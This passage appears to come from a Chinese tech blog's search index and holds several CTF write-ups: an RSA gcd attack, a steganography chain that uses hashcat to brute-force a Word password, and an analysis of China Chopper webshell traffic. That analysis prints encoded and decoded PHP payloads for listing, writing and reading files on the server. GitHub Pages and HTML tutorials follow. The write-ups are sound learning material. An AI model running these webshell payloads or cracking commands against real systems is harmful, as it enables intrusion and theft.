6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889n19 = 26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659c19 = 386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19]for i in range(len(n)): for j in range(len(n)): if i != j: if gmpy2.gcd(n[i], n[j]) != 1: p = gmpy2.gcd(n[i], n[j]) q = n[i] // p d = gmpy2.invert(e, (p - 1) * (q - 1)) m = pow(c[i], d, n[i])print(long_to_bytes(int(m))) # flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125; 参考文章： RSA 介绍 RSA 算法原理及 CTF 解题 CTF 中 RSA 常见攻击方法","tags":["CTF","古典密码","DES算法","梅森旋转算法","RSA加密"],"categories":["CTF"]},{"title":"【CTF】Misc图片处理题：ACTF wanna png","path":"//CTF/Misc/image_processing_1.html","content":"考点 Binwalk 分离 盲水印 crypto 解密 hashcat 爆破 docx 隐藏文字 bmp 隐写 解题过程1. Binwalk 分离拿到图片先进行 Binwalk 文件分析，可以看到有个 zip 压缩包，则 Binwalk 分离提取压缩包。 12341:PNG image, 440 x 449, 8-bit/color RGB, non-interlaced2:Zlib compressed data, compressed3:Zip archive data, at least v2.0 to extract, compressed size: 192868, uncompressed size: 205062, name: wanan.png4:End of Zip archive, footer length: 22 2. 盲水印进入压缩包后有wanan.png和舔狗日记.crypto两个文件，仔细看则会发现两个图片几乎一样，则容易联想到可能是盲水印。使用随波逐流工具箱或者BlindWaterMark进行双图盲水印（key）解密，得到关键信息 1:ARJXU4MjE0。 wanan.png 为题目图片， wanan2.png 为解压后的图片。 1python bwmforpy3.py decode wanan.png wanan2.png out.png 3. crypto 解密.crypto文件使用Encrypto打开，输入前面获取的ARJXU4MjE0，得到三个文件舔狗日记1.docx、舔狗日记2.docx、最终我不想舔了.bmp. word 需要配置打开隐藏文字的格式标记，否则后面无法展示隐藏文字。 打开舔狗日记1.docx，全选文字颜色加深，发现没有异常，使用 Binwalk 文件分析，发现有异常的remember.zip。 Binwalk 文件分析123456789101112131415161718192021221:Zip archive data, at least v2.0 to extract, compressed size: 350, uncompressed size: 1432, name: [Content_Types].xml2:Zip archive data, at least v2.0 to extract, name: _rels/3:Zip archive data, at least v2.0 to extract, compressed size: 247, uncompressed size: 737, name: _rels/.rels4:Zip archive data, at least v2.0 to extract, name: customXml/5:Zip archive data, at least v2.0 to extract, name: customXml/_rels/6:Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 296, name: customXml/_rels/item1.xml.rels7:Zip archive data, at least v2.0 to extract, compressed size: 149, uncompressed size: 258, name: customXml/item1.xml8:Zip archive data, at least v2.0 to extract, compressed size: 228, uncompressed size: 327, name: customXml/itemProps1.xml9:Zip archive data, at least v2.0 to extract, name: docProps/10:Zip archive data, at least v2.0 to extract, compressed size: 346, uncompressed size: 624, name: docProps/app.xml11:Zip archive data, at least v2.0 to extract, compressed size: 327, uncompressed size: 633, name: docProps/core.xml12:Zip archive data, at least v2.0 to extract, compressed size: 252, uncompressed size: 383, name: docProps/custom.xml13:Zip archive data, at least v2.0 to extract, compressed size: 162, uncompressed size: 224, name: remember.zip14:Zip archive data, at least v2.0 to extract, name: word/15:Zip archive data, at least v2.0 to extract, name: word/_rels/16:Zip archive data, at least v2.0 to extract, compressed size: 246, uncompressed size: 822, name: word/_rels/document.xml.rels17:Zip archive data, at least v2.0 to extract, compressed size: 3739, uncompressed size: 57660, name: word/document.xml18:Zip archive data, at least v2.0 to extract, compressed size: 682, uncompressed size: 3062, name: word/fontTable.xml19:Zip archive data, at least v2.0 to extract, compressed size: 1026, uncompressed size: 2629, name: word/settings.xml20:Zip archive data, at least v2.0 to extract, compressed size: 2328, uncompressed size: 26902, name: word/styles.xml21:Zip archive data, at least v2.0 to extract, name: word/theme/22:Zip archive data, at least v2.0 to extract, compressed size: 1339, uncompressed size: 6436, name: word/theme/theme1.xml 将该 word 文件后缀改为.zip后解压，拿到remember.zip。解压，打开里面的remember.txt，获取关键信息 2：那天，你告诉了我你最重要的8个数字，我记住了。从中获取关键信息 3：8个数字 4. hashcat 爆破打开舔狗日记2.docx，发现需要密码，再加上前面得知密码为 8 个数字。所以选择使用 hashcat 爆破 word 密码。使用 hashcat 爆破前需要得到 hash 值，所以我们使用 Office2john 获取舔狗日记2.docx的 hash 值（文件路径不能有中文，需要改名）。 在john-1.8.0-jumbo-1\\run目录下执行： 1python office2john.py 2.docx &gt; hash 获取文件 hash，打开删除前面的2.docx:，得到 hash 1$office$*2007*20*128*16*e8acb3ffadb859fcd9c0f38906f5a9b5*dc0a3deef00efb5fcdc115daa4784734*f97102e56fc53cf48fedba9a927e149d711928b2 可以看到是 2007 版本 office。 在 hashcat 文件夹下执行.\\hashcat.exe --help | findstr Office，获得 office 的 Hash modes。 12345678910 9400 | MS Office 2007 | Document 9500 | MS Office 2010 | Document 9600 | MS Office 2013 | Document25300 | MS Office 2016 - SheetProtection | Document 9700 | MS Office &lt;= 2003 $0/$1, MD5 + RC4 | Document 9710 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #1 | Document 9720 | MS Office &lt;= 2003 $0/$1, MD5 + RC4, collider #2 | Document 9810 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #1 | Document 9820 | MS Office &lt;= 2003 $3, SHA1 + RC4, collider #2 | Document 9800 | MS Office &lt;= 2003 $3/$4, SHA1 + RC4 | Document 2007对应9400的 hash 类型，使用 hashcat 爆破，得到关键信息 4：19990821。 1.\\hashcat.exe -m 9400 hash -a 3 ?d?d?d?d?d?d?d?d -w 3 -O hashcat 同一个文件如果执行过的会保存记录，需要加--show展示密码 5. docx 隐藏文字输入密码后，打开舔狗日记2.docx，全选文字，并且加深后，会发现出现隐藏文字，关键信息 5：HowCaniForgetyou。 6. bmp 隐写还有一个 bmp 文件最终我不想舔了.bmp没有用到，推测为 bmp 隐写，我们使用软件wbStego4.3open，输入图片路径和密码，得到 txt 文件， 里面为最后的 flag：ACTF&#123;Tr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve&#125;。 此 flag：Tr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve为 Leet speak 加密，解密为TriedToForgetYouButFinallyTurnsToForgive，意为尝试忘记你，但最终选择原谅。 参考文章 ACTF2020 部分 wp HashCat 恢复 Excel、Word、PPT 密码保姆教程","tags":["CTF","图片处理","Misc"],"categories":["CTF"]},{"title":"【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析","path":"//CTF/Misc/traffic_analysis_1.html","content":"考点 Wireshark 流量分析 Php 代码分析 Hex 转写 Jpg zip 文件头 解题过程1. Wireshark 流量分析使用 wireshark 打开 pcapng 文件，筛选 http 流量。 点击文件 -&gt; 导出对象 -&gt; HTTP Content Type 选择 All Content-Types，然后点击全部保存，选择导出文件夹，导出全部 HTTP 流量。 ALL Content-Types：所有的内容类型。application&#x2F;octet-stream：类型为字节流（二进制文件），浏览器默认方式为下载。application&#x2F;x-www-form-urlencoded：将表单内容转化为一种能够通过 URL 传输的形式，将键和值对连结起来，形式接近于 URL 的查询字符串。在这个过程中，特定的字符被替换成 %XX 形式，其中 XX 是对应字符的 ASCII 码的十六进制表示，而空白则被替换成加号（+）。text&#x2F;html：内容是 html，浏览器在获取到这种文件时会自动调用 html 的解析器对文件进行相应的处理。 2. php 代码分析查看文件详情首先找到 1.php ，我们进行分析。1aa=@eval\u0001(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3Dbase64_decode：以下内容为 base64 编码action：入侵行为，值经过了 base64 编码与 urlencode 编码，通过 CyberChef 双重解码（URL Decode, From Base64）后得到 php 代码格式化后如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 关闭错误显示@ini_set(&quot;display_errors&quot;, &quot;0&quot;);// 移除脚本执行的时间限制，允许脚本无限期运行@set_time_limit(0);// 关闭魔术引号，该功能会自动在字符串的引号前添加转义字符@set_magic_quotes_runtime(0);// 输出开始分隔符echo &quot;-&gt;|&quot;;// 获取当前脚本的目录路径$D = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);if ($D == &quot;&quot;) &#123; // 如果SCRIPT_FILENAME为空，则尝试使用PATH_TRANSLATED $D = dirname($_SERVER[&quot;PATH_TRANSLATED&quot;]);&#125;// 将目录路径添加到变量R，并添加制表符作为分隔$R = &quot;&#123;$D&#125;\\t&quot;;// 检查目录路径是否以根目录符号&quot;/&quot;开头if (substr($D, 0, 1) != &quot;/&quot;) &#123; // 如果不是，遍历A到Z的驱动器，如果存在，则添加到R foreach (range(&quot;A&quot;, &quot;Z&quot;) as $L) &#123; if (is_dir(&quot;&#123;$L&#125;:&quot;)) &#123; $R .= &quot;&#123;$L&#125;:&quot;; &#125; &#125; // 添加制表符作为分隔 $R .= &quot;\\t&quot;;&#125;// 使用posix_getegid和posix_getpwuid获取当前用户的用户名，如果函数不存在，则使用get_current_user$u = (function_exists(&#x27;posix_getegid&#x27;)) ? @posix_getpwuid(@posix_geteuid()) : &#x27;&#x27;;$usr = ($u) ? $u[&#x27;name&#x27;] : @get_current_user();// 将系统信息和用户信息添加到R$R .= php_uname();$R .= &quot;(&#123;$usr&#125;)&quot;;// 打印结果print $R;// 输出结束分隔符echo &quot;|&lt;-&quot;;// 终止脚本执行die();将返回的结果格式化后：123456-&gt;|D:/wamp64/www/uploadC:D:E:Windows NT DESKTOP-5E59GR7 10.0 build 15063 (Windows 10) AMD64(SYSTEM)|&lt;-需要注意的点输出的前面有个-&gt;|，输出的后面有个|&lt;-，可能会影响后续下载文件的内容。查看文件夹D:\\wamp64\\www\\upload然后查看了文件夹内容以及权限，发现是777，可以下载文件。1aa=@eval\u0001(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3Daction 如下1QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7解码并且格式化后代码为12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 关闭错误显示@ini_set(&quot;display_errors&quot;, &quot;0&quot;);// 移除脚本执行的时间限制@set_time_limit(0);// 关闭魔术引号@set_magic_quotes_runtime(0);// 输出开始分隔符echo &quot;-&gt;|&quot;;// 解码通过POST方法传递的路径$D = base64_decode($_POST[&quot;z1&quot;]);// 尝试打开目录$F = @opendir($D);if ($F === NULL) &#123; // 如果目录打开失败，输出错误信息 echo &quot;ERROR:// Path Not Found Or No Permission!&quot;;&#125; else &#123; // 初始化变量用于存储目录和文件列表 $M = NULL; $L = NULL; // 读取目录中的每个条目 while ($N = @readdir($F)) &#123; $P = $D . &quot;/&quot; . $N; // 构建完整的文件路径 $T = @date(&quot;Y-m-d H:i:s&quot;, @filemtime($P)); // 获取文件最后修改时间 $E = substr(base_convert(@fileperms($P), 10, 8), -4); // 获取文件权限 $R = &quot;\\t&quot; . $T . &quot;\\t&quot; . @filesize($P) . &quot;\\t&quot; . $E . &quot;&quot;; // 构建输出格式 // 根据是否为目录，将文件或目录信息添加到相应的变量中 if (@is_dir($P)) &#123; $M .= $N . &quot;/&quot; . $R; &#125; else &#123; $L .= $N . $R; &#125; &#125; // 输出目录和文件列表 echo $M . $L; // 关闭目录句柄 @closedir($F);&#125;// 输出结束分隔符echo &quot;|&lt;-&quot;;// 终止脚本执行die();代码功能为获取文件夹的内容，需要参数z1。此处z1：RDpcd2FtcDY0XHd3d1x1cGxvYWQ%3D，解码后为D:\\wamp64\\www\\upload，将返回的结果格式化后：1234567-&gt;|./ 2017-12-08 11:38:58\t0\t0777../ 2017-12-08 11:39:10\t4096\t07771.php 2017-12-08 11:33:16\t33\t0666flag.txt 2017-12-08 11:35:29\t17\t0666hello.zip 2017-12-08 09:32:36\t224\t0666|&lt;-我们可以注意到有个flag.txt和hello.zip（我们要的flag在中hello.zip，其实flag.txt并没有获取）查看文件夹D:\\wamp64\\www\\将z1换为RDpcd2FtcDY0XHd3d1w%3D，解码后为D:\\wamp64\\www\\，将输出格式化后为12345678910111213141516171819202122232425-&gt;|./ 2017-12-08 11:39:10\t4096\t0777../ 2017-11-17 18:15:03\t4096\t0777admin/ 2017-11-17 18:15:53\t8192\t0777install/ 2017-11-17 18:15:54\t4096\t0777tools/ 2017-11-17 18:15:54\t4096\t0777typecho/ 2017-12-08 11:39:10\t4096\t0777upload/ 2017-12-08 11:38:58\t0\t0777usr/ 2017-11-17 18:15:54\t0\t0777var/ 2017-11-17 18:15:54\t4096\t0777.gitattributes 2015-05-02 05:31:05\t386\t0666.gitignore 2015-05-02 05:31:05\t234\t0666.gitmodules 2015-05-02 05:31:05\t0\t0666.travis.yml 2015-05-02 05:31:05\t114\t0666aa.php 2017-10-27 16:02:31\t26\t0666changelog.txt 2015-05-02 05:31:05\t2135\t0666config.inc.php 2017-10-26 14:01:04\t1521\t0666index.php 2015-05-02 05:31:05\t721\t0666install.php 2015-05-02 05:31:05\t47405\t0666license.txt 2015-05-02 05:31:05\t14974\t0666p0.php 2017-10-26 14:31:28\t26\t0666README.md 2015-05-02 05:31:05\t205\t0666todo.txt 2015-05-02 05:31:05\t122\t0666x1n.php 2017-10-26 14:51:13\t27\t0666|&lt;-查看文件夹D:\\wamp64\\将z1换为RDpcd2FtcDY0XA%3D%3D，解码后为D:\\wamp64\\，结果格式化为1234567891011121314151617181920212223242526-&gt;|./ 2017-11-17 18:15:03\t4096\t0777../ 2017-12-08 04:45:53\t4096\t0777alias/ 2017-11-17 18:15:03\t0\t0777apps/ 2017-11-17 18:15:03\t0\t0777bin/ 2017-11-17 18:15:24\t0\t0777cgi-bin/ 2017-11-17 18:15:32\t0\t0777lang/ 2017-11-17 18:15:32\t4096\t0777logs/ 2017-11-17 18:15:32\t0\t0777scripts/ 2017-11-17 18:15:32\t4096\t0777tmp/ 2017-11-27 06:51:26\t40960\t0777www/ 2017-12-08 11:39:10\t4096\t0777barimage.bmp 2010-12-31 01:39:42\t4790\t0666images_off.bmp 2016-08-01 08:21:38\t26934\t0666images_on.bmp 2016-08-01 08:22:36\t26934\t0666install-english.txt 2016-10-16 07:09:46\t3380\t0666license-english.txt 2015-11-06 03:00:26\t8156\t0666read_after_install-english.txt 2016-03-08 11:45:22\t1191\t0666unins000.dat 2017-10-10 07:11:50\t972306\t0666unins000.exe 2017-10-10 07:09:38\t1401105\t0777uninstall_services.bat 2017-10-10 07:09:51\t132\t0777wampmanager.conf 2017-11-14 14:28:47\t1636\t0666wampmanager.exe 2008-09-03 07:46:36\t1233408\t0777wampmanager.ini 2017-12-08 11:33:55\t508782\t0666wampmanager.tpl 2016-08-22 02:42:00\t24039\t0666|&lt;- 3. Hex 转写 Jpg接着在D:\\wamp64\\www\\upload文件夹中新建图片6666.jpg，并且写入二进制信息。 写入图片的php代码action 为1QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik%2FIjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw解码后的 php 为：1234567891011121314151617181920212223242526272829303132333435363738// 关闭错误显示@ini_set(&quot;display_errors&quot;, &quot;0&quot;);// 移除脚本执行的时间限制@set_time_limit(0);// 关闭魔术引号@set_magic_quotes_runtime(0);// 输出开始分隔符echo &quot;-&gt;|&quot;;// 解码通过POST方法传递的文件路径$f = base64_decode($_POST[&quot;z1&quot;]);// 获取通过POST方法传递的文件内容$c = $_POST[&quot;z2&quot;];// 清除可能存在的回车和换行符$c = str_replace(&quot;\\r&quot;, &quot;&quot;, $c);$c = str_replace(&quot; &quot;, &quot;&quot;, $c);// 初始化缓冲区变量$buf = &quot;&quot;;// 将十六进制编码的字符串转换为原始二进制数据for ($i = 0; $i &lt; strlen($c); $i += 2) &#123; $buf .= urldecode(&quot;%&quot; . substr($c, $i, 2));&#125;// 尝试写入文件，并根据操作结果输出“1”或“0”echo (@fwrite(fopen($f, &quot;w&quot;), $buf) ? &quot;1&quot; : &quot;0&quot;);// 输出结束分隔符echo &quot;|&lt;-&quot;;// 终止脚本执行die(); 输入的参数z1（图片名）为D:\\wamp64\\www\\upload\\6666.jpg，z2为图片的十六进制信息。我们获取到z2后,将其转换为.jpg格式。 123456789101112131415161718192021222324252627# HexToJpg.pydef hex_to_jpg(hex_file_path, jpg_file_path): &quot;&quot;&quot; 将十六进制文本文件转换为JPEG图片文件。 :param hex_file_path: 十六进制文本文件的路径。 :param jpg_file_path: 要保存JPEG图片的路径。 &quot;&quot;&quot; with open(hex_file_path, &quot;r&quot;) as hex_file: # 从文件中读取十六进制数据 hex_data = hex_file.read() # 删除任何空白字符（空格、换行符等） hex_data = hex_data.replace(&quot; &quot;, &quot;&quot;).replace(&quot; &quot;, &quot;&quot;) # 将十六进制数据转换为二进制数据 binary_data = bytes.fromhex(hex_data) # 将二进制数据写入JPEG文件 with open(jpg_file_path, &quot;wb&quot;) as jpg_file: jpg_file.write(binary_data)# 示例使用：hex_file_path = r&quot;.\\6666.txt&quot; # 替换为你的十六进制文件路径jpg_file_path = &quot;6666.jpg&quot; # 替换为你希望保存的JPEG文件路径hex_to_jpg(hex_file_path, jpg_file_path) 转换后的图片如下： 拿到关键信息Th1s_1s_p4sswd_!!! 4. zip 文件头接着读取了D:\\wamp64\\www\\upload\\hello.zip文件。 读取zip的php代码action 为1QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D解码后脚本为：1234567891011121314151617181920212223242526272829303132333435363738&lt;?php// 关闭错误显示，防止错误信息泄露@ini_set(&quot;display_errors&quot;, &quot;0&quot;);// 移除脚本执行的时间限制，允许脚本长时间运行@set_time_limit(0);// 关闭魔术引号，防止自动添加转义字符@set_magic_quotes_runtime(0);// 输出开始分隔符，用于标识响应开始echo &quot;-&gt;|&quot;;// 从POST请求中获取base64编码的文件路径，并进行解码$F = base64_decode($_POST[&quot;z1&quot;]);// 尝试以只读模式打开文件$P = @fopen($F, &quot;r&quot;);// 检查文件是否成功打开if ($P === false) &#123; // 如果文件打开失败，输出错误信息并终止脚本 echo &quot;ERROR:// File cannot be opened.&quot;; die();&#125;// 读取文件内容，filesize($F)获取文件大小，确保读取整个文件echo @fread($P, filesize($F));// 关闭文件句柄，释放资源@fclose($P);// 输出结束分隔符，用于标识响应结束echo &quot;|&lt;-&quot;;// 终止脚本执行die();?&gt; 读取 zip 接着的下个 php 文件，即为 zip 文件，我们将后缀修改为.zip，用 WinHex 查看。 注意到zip 文件头多了2D3E7C，文件尾多了7C3C2D，我们将其删除，发现压缩包已经可以正常打开但是有密码。 zip 的文件头由504B0304开头 我们输入前面拿到的关键信息Th1s_1s_p4sswd_!!!后，拿到flag.txt。最终 flag 为flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;。 优化点 zip 可以直接用 Binwalk 提取 可以只看 request 头和 response 包体 jpg 文件头由FFD8FF开头，由FFD9结尾，可以快速确定是个图片。 保存图片可以用 WinHex 打开那个报文后，删除多余信息，另存为.jpg文件 参考文章 Misc 第八篇——功夫再高也怕菜刀（数据恢复、报文分析）","tags":["CTF","Misc","流量分析"],"categories":["CTF"]},{"title":"【技术教程】GitHub Pages 自定义域名配置指南","path":"//tutorial/github_domain.html","content":"本文无广告，请放心浏览。文章使用腾讯云仅因为域名购买于腾讯云，购买于其他服务商可参考本文的第2，3步。 笔者默认您已经拥有域名并且完成备案，GitHub Pages 搭建完成。 1. 解析域名添加 DNS 解析打开域名管理页面添加 DNS 记录。 填写说明 主机记录填写您的二级域名 记录类型选择 CNAME 记录值填写您的博客的仓库名，如：xxx.github.io TTL 填写 600（默认值） 2. 仓库创建 CNAME 文件添加 CNAME 文件方法有两种： 【通用】创建 CNAME 文件Github Pages 仓库下新建文件，git 时可能会被覆盖。 【Hexo】创建 CNAME 文件source 文件夹下创建 CNAME 文件，每次 Build 都会生成。 CNAME 文件说明 文件名为：CNAME（全大写，无后缀） 文本内容为：您的二级域名 3. 设置自定义域名Github Pages 仓库中选择 Settings 的 Pages 选项，填写 Custom domain，填写您的二级域名，点击 Save。Github 会检查您的 DNS 配置是否正确，确认后会自动申请 TLS 证书（Let’s Encrtpy）。 开启 HTTPS（推荐）勾选 Enable HTTPS，若无法勾选可以等待 TLS 证书申请成功后再次尝试。 参考文章 GitHub Pages 搭建的博客绑定域名 GitHub Page 绑定自定义域名 + 开启 HTTPS 超详细 Hexo + Github Pages 博客搭建教程","tags":["github","域名","腾讯云"],"categories":["github"]},{"title":"【良心推荐】仅需三分钟，美化你的github文件图标","path":"//recommend/github_file_icons.html","content":"1. GitHub File Icons这是一个 Chrome 插件，安装后即可美化 github 自带文件图标。 Github 链接 商店下载 优化后效果 2. Github 网页图标主题这是一个 Tampermonkey 脚本（使用教程），使用了 vscode-material-icon-theme 主题的 icon，比 GitHub File Icons 的图标更加好看。 Github 链接脚本 greasyfork 安装链接，可以自动安装到 Tampermonkey。 github 脚本下载链接，下载后自行导入 Tampermonkey（导入教程）。 图标库 优化后效果 该脚本优化建议脚本第 165 行，图标使用 jsdelivr 加速。 12- const url = `https://raw.githubusercontent.com/PKief/vscode-material-icon-theme/main/icons/$&#123;name&#125;.svg`+ const url = `https://fastly.jsdelivr.net/gh/material-extensions/vscode-material-icon-theme/icons/$&#123;name&#125;.svg`","tags":["github","图标美化","优化"],"categories":["github"]},{"title":"【HTML】原生HTML密码管理：集成Toast通知的前端实现","path":"//coding/html/pwd_manager.html","content":"实现的功能 账密展示 原生 Toast 展示复制情况 点击复制 为什么强调原生因为不需要引用第三方库，可以提高保密性并且在无网环境&#x2F;内网环境中使用html 复健 如何使用密码写在 html 中或者引入 pwd.js 若密码写在 html 中，则注释此行&lt;script src=&quot;./pwd.js&quot;&gt;&lt;/script&gt;（默认）若密码单独写在 pwd.js 中，则注释 html 中 pwdInfo 的部分 （便于维护） index.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot; /&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot; /&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt; &lt;title&gt;MiHoYo Password&lt;/title&gt; &lt;!-- &lt;script src=&quot;./pwd.js&quot;&gt;&lt;/script&gt; --&gt; &lt;script&gt; const pwdInfo = [ &#123; id: 0, name: &quot;aaa&quot;, phone: &quot;111&quot;, password: &quot;111&quot;, &#125;, &#123; id: 1, name: &quot;bbb&quot;, phone: &quot;222&quot;, password: &quot;222&quot;, &#125;, ]; &lt;/script&gt; &lt;style&gt; * &#123; font-family: PingFang SC, Helvetic1, sans-serif; padding: 0; margin: 0; &#125; .layout &#123; height: 100vh; display: flex; justify-content: center; align-items: center; &#125; .bigBox &#123; margin: auto; display: flex; flex-flow: wrap; justify-content: center; &#125; .personBox &#123; height: 100px; max-height: 200px; max-width: 300px; display: flex; flex-flow: column; justify-content: center; align-items: start; padding: 8px 20px; margin: 15px; border-radius: 10px; background-color: #4b6f98ef; transition: background-color 0.2s; &#125; .personBox:hover &#123; background-color: #2b4460; &#125; h3 &#123; color: #eee; padding-bottom: 3px; &#125; a &#123; cursor: pointer; padding: 1px 0; font-size: 14px; color: #eee; transition: font-size 0.5s; &#125; a:hover &#123; font-size: 15px; &#125; /* 以下为toast */ /* toast内容样式 */ .toast &#123; position: fixed; top: 0; right: 0; margin: 15px; padding: 15px; background-color: white; border-radius: 5px; border: 1px solid #eee; /* 加入边框 */ box-shadow: 0 2px 4px rgba(0, 